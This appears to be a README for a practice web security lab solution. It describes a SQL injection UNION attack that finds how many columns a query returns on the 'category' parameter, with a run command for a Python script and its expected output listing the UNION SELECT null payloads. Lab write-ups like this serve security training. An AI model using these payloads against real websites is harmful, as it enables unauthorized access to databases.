# Hack Steps

1. Inject payload into 'category' query parameter to determine the number of columns.
2. Add one additional null column at a time.
3. Repeat this process, increasing the number of columns until you receive a valid response.

# Run Script

1. Change the URL of the lab
2. Start script

```
~$ python sql_injection_union_attack_determining_the_number_of_columns_returned_by_the_query.py
```

# Expected Output

```
[#] Injection parameter: category
[*] Trying payload: ' UNION SELECT null-- -
[*] Trying payload: ' UNION SELECT null, null-- -
[*] Trying payload: ' UNION SELECT null, null, null-- -
[#] Number of columns: 3
[#] Check your browser, it should be marked now as solved
```
